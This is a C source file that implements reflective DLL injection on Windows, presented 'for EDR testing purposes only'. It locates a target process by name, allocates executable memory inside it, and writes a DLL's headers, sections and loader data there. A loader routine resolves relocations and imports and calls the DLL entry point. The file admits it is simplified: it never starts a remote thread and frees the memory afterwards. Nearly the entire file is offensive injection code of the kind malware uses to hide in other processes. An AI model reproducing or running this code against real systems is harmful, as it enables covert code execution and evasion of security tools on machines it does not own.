/*
 * Reflective DLL Injection
 * 
 * This technique loads a DLL from memory without using LoadLibrary:
 * 1. Read DLL from disk into memory
 * 2. Parse PE headers
 * 3. Allocate memory in target process
 * 4. Copy DLL sections
 * 5. Process relocations
 * 6. Resolve imports
 * 7. Call DLL entry point
 * 
 * For EDR testing purposes only.
 * 
 * Note: This is a simplified version. A full implementation would need
 * a reflective loader stub that can be injected and executed.
 */

#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

typedef HMODULE (WINAPI *LoadLibraryAFunc)(LPCSTR);
typedef FARPROC (WINAPI *GetProcAddressFunc)(HMODULE, LPCSTR);
typedef BOOL (WINAPI *DllMainFunc)(HINSTANCE, DWORD, LPVOID);

// Reflective loader structure to pass to remote process
typedef struct {
    LPVOID ImageBase;
    PIMAGE_NT_HEADERS NtHeaders;
    PIMAGE_BASE_RELOCATION BaseRelocation;
    PIMAGE_IMPORT_DESCRIPTOR ImportDirectory;
    LoadLibraryAFunc fnLoadLibraryA;
    GetProcAddressFunc fnGetProcAddress;
} LOADER_DATA, *PLOADER_DATA;

DWORD GetProcessIdByName(const char* processName) {
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }
    
    DWORD pid = 0;
    if (Process32First(hSnapshot, &pe32)) {
        do {
            if (_stricmp(pe32.szExeFile, processName) == 0) {
                pid = pe32.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnapshot, &pe32));
    }
    
    CloseHandle(hSnapshot);
    return pid;
}

// Reflective loader function (this would be copied to remote process)
DWORD WINAPI ReflectiveLoader(LPVOID lpParameter) {
    PLOADER_DATA loaderData = (PLOADER_DATA)lpParameter;
    
    // Process base relocations
    if (loaderData->BaseRelocation && loaderData->NtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size) {
        PIMAGE_BASE_RELOCATION relocation = loaderData->BaseRelocation;
        DWORD_PTR delta = (DWORD_PTR)loaderData->ImageBase - loaderData->NtHeaders->OptionalHeader.ImageBase;
        
        while (relocation->VirtualAddress) {
            if (relocation->SizeOfBlock >= sizeof(IMAGE_BASE_RELOCATION)) {
                DWORD count = (relocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                PWORD list = (PWORD)(relocation + 1);
                
                for (DWORD i = 0; i < count; i++) {
                    if (list[i]) {
                        PDWORD_PTR ptr = (PDWORD_PTR)((LPBYTE)loaderData->ImageBase + (relocation->VirtualAddress + (list[i] & 0xFFF)));
                        *ptr += delta;
                    }
                }
            }
            
            relocation = (PIMAGE_BASE_RELOCATION)((LPBYTE)relocation + relocation->SizeOfBlock);
        }
    }
    
    // Process imports
    if (loaderData->ImportDirectory && loaderData->NtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size) {
        PIMAGE_IMPORT_DESCRIPTOR importDesc = loaderData->ImportDirectory;
        
        while (importDesc->Name) {
            LPCSTR libName = (LPCSTR)((LPBYTE)loaderData->ImageBase + importDesc->Name);
            HMODULE hLib = loaderData->fnLoadLibraryA(libName);
            
            if (hLib) {
                PIMAGE_THUNK_DATA thunk = NULL;
                PIMAGE_THUNK_DATA funcRef = NULL;
                
                if (importDesc->OriginalFirstThunk) {
                    thunk = (PIMAGE_THUNK_DATA)((LPBYTE)loaderData->ImageBase + importDesc->OriginalFirstThunk);
                    funcRef = (PIMAGE_THUNK_DATA)((LPBYTE)loaderData->ImageBase + importDesc->FirstThunk);
                } else {
                    thunk = (PIMAGE_THUNK_DATA)((LPBYTE)loaderData->ImageBase + importDesc->FirstThunk);
                    funcRef = (PIMAGE_THUNK_DATA)((LPBYTE)loaderData->ImageBase + importDesc->FirstThunk);
                }
                
                while (thunk->u1.AddressOfData) {
                    if (IMAGE_SNAP_BY_ORDINAL(thunk->u1.Ordinal)) {
                        funcRef->u1.Function = (DWORD_PTR)loaderData->fnGetProcAddress(hLib, (LPCSTR)IMAGE_ORDINAL(thunk->u1.Ordinal));
                    } else {
                        PIMAGE_IMPORT_BY_NAME funcName = (PIMAGE_IMPORT_BY_NAME)((LPBYTE)loaderData->ImageBase + thunk->u1.AddressOfData);
                        funcRef->u1.Function = (DWORD_PTR)loaderData->fnGetProcAddress(hLib, funcName->Name);
                    }
                    
                    thunk++;
                    funcRef++;
                }
            }
            
            importDesc++;
        }
    }
    
    // Call DLL entry point
    if (loaderData->NtHeaders->OptionalHeader.AddressOfEntryPoint) {
        DllMainFunc dllMain = (DllMainFunc)((LPBYTE)loaderData->ImageBase + loaderData->NtHeaders->OptionalHeader.AddressOfEntryPoint);
        return dllMain((HINSTANCE)loaderData->ImageBase, DLL_PROCESS_ATTACH, NULL);
    }
    
    return TRUE;
}

int main(int argc, char* argv[]) {
    if (argc < 3) {
        printf("Usage: %s <process_name> <dll_path>\n", argv[0]);
        printf("Example: %s notepad.exe C:\\\\path\\\\to\\\\your.dll\n", argv[0]);
        return 1;
    }
    
    const char* processName = argv[1];
    const char* dllPath = argv[2];
    
    printf("[*] Reflective DLL Injection Technique\n");
    printf("[*] Target Process: %s\n", processName);
    printf("[*] DLL Path: %s\n", dllPath);
    
    // Step 1: Read DLL file
    HANDLE hFile = CreateFileA(dllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[!] Error: Failed to open DLL file. Error: %d\n", GetLastError());
        return 1;
    }
    
    DWORD fileSize = GetFileSize(hFile, NULL);
    BYTE* pDllData = (BYTE*)malloc(fileSize);
    
    DWORD bytesRead;
    if (!ReadFile(hFile, pDllData, fileSize, &bytesRead, NULL)) {
        printf("[!] Error: Failed to read DLL file\n");
        CloseHandle(hFile);
        free(pDllData);
        return 1;
    }
    CloseHandle(hFile);
    printf("[+] DLL loaded into memory (%d bytes)\n", fileSize);
    
    // Step 2: Parse PE headers
    IMAGE_DOS_HEADER* pDosHeader = (IMAGE_DOS_HEADER*)pDllData;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        printf("[!] Error: Invalid DOS signature\n");
        free(pDllData);
        return 1;
    }
    
    IMAGE_NT_HEADERS* pNtHeaders = (IMAGE_NT_HEADERS*)(pDllData + pDosHeader->e_lfanew);
    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
        printf("[!] Error: Invalid NT signature\n");
        free(pDllData);
        return 1;
    }
    printf("[+] Valid PE file detected\n");
    
    // Step 3: Get target process
    DWORD pid = GetProcessIdByName(processName);
    if (pid == 0) {
        printf("[!] Error: Process '%s' not found\n", processName);
        free(pDllData);
        return 1;
    }
    printf("[+] Found process with PID: %d\n", pid);
    
    // Step 4: Open process
    HANDLE hProcess = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        FALSE,
        pid
    );
    
    if (hProcess == NULL) {
        printf("[!] Error: Failed to open process. Error: %d\n", GetLastError());
        free(pDllData);
        return 1;
    }
    printf("[+] Process handle obtained\n");
    
    // Step 5: Allocate memory for DLL image
    LPVOID pRemoteImage = VirtualAllocEx(
        hProcess,
        NULL,
        pNtHeaders->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    
    if (pRemoteImage == NULL) {
        printf("[!] Error: Failed to allocate memory for image. Error: %d\n", GetLastError());
        CloseHandle(hProcess);
        free(pDllData);
        return 1;
    }
    printf("[+] Remote image allocated at: 0x%p (%d bytes)\n", pRemoteImage, pNtHeaders->OptionalHeader.SizeOfImage);
    
    // Step 6: Copy headers
    if (!WriteProcessMemory(hProcess, pRemoteImage, pDllData, pNtHeaders->OptionalHeader.SizeOfHeaders, NULL)) {
        printf("[!] Error: Failed to write headers\n");
        VirtualFreeEx(hProcess, pRemoteImage, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        free(pDllData);
        return 1;
    }
    printf("[+] Headers written\n");
    
    // Step 7: Copy sections
    IMAGE_SECTION_HEADER* pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);
    for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
        if (!WriteProcessMemory(
            hProcess,
            (PVOID)((LPBYTE)pRemoteImage + pSectionHeader[i].VirtualAddress),
            (PVOID)(pDllData + pSectionHeader[i].PointerToRawData),
            pSectionHeader[i].SizeOfRawData,
            NULL
        )) {
            printf("[!] Error: Failed to write section %s\n", pSectionHeader[i].Name);
        } else {
            printf("[+] Section %s written\n", pSectionHeader[i].Name);
        }
    }
    
    // Step 8: Allocate and write loader data
    LOADER_DATA loaderData = {0};
    loaderData.ImageBase = pRemoteImage;
    loaderData.NtHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)pRemoteImage + pDosHeader->e_lfanew);
    
    if (pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size) {
        loaderData.BaseRelocation = (PIMAGE_BASE_RELOCATION)((LPBYTE)pRemoteImage + 
            pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
    }
    
    if (pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size) {
        loaderData.ImportDirectory = (PIMAGE_IMPORT_DESCRIPTOR)((LPBYTE)pRemoteImage + 
            pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
    }
    
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    loaderData.fnLoadLibraryA = (LoadLibraryAFunc)GetProcAddress(hKernel32, "LoadLibraryA");
    loaderData.fnGetProcAddress = (GetProcAddressFunc)GetProcAddress(hKernel32, "GetProcAddress");
    
    LPVOID pRemoteLoaderData = VirtualAllocEx(
        hProcess,
        NULL,
        sizeof(LOADER_DATA),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
    
    if (pRemoteLoaderData == NULL) {
        printf("[!] Error: Failed to allocate memory for loader data\n");
        VirtualFreeEx(hProcess, pRemoteImage, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        free(pDllData);
        return 1;
    }
    
    if (!WriteProcessMemory(hProcess, pRemoteLoaderData, &loaderData, sizeof(LOADER_DATA), NULL)) {
        printf("[!] Error: Failed to write loader data\n");
        VirtualFreeEx(hProcess, pRemoteLoaderData, 0, MEM_RELEASE);
        VirtualFreeEx(hProcess, pRemoteImage, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        free(pDllData);
        return 1;
    }
    printf("[+] Loader data written\n");
    
    printf("[*] Note: Full reflective injection requires a loader stub\n");
    printf("[*] This implementation demonstrates the concept\n");
    printf("[+] Reflective DLL injection setup completed\n");
    
    // Cleanup
    VirtualFreeEx(hProcess, pRemoteLoaderData, 0, MEM_RELEASE);
    VirtualFreeEx(hProcess, pRemoteImage, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    free(pDllData);
    
    return 0;
}
